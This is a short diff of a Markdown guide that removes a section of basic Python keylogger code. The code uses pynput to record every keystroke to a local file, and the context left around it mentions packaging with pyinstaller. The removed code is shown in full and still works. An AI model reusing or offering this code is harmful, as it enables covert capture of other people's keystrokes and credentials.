@@ -50,21 +50,6 @@ pip install pynput
 ### **6. Convert to Executable (Optional)**
 - Use `pyinstaller` to create an executable file.
 
----
-
-## **Basic Python Keylogger Code**
-```python
-from pynput.keyboard import Listener
-
-log_file = "keylog.txt"
-
-def on_press(key):
-    with open(log_file, "a") as f:
-        f.write(str(key) + "\n")
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
-```
 
 ---
 
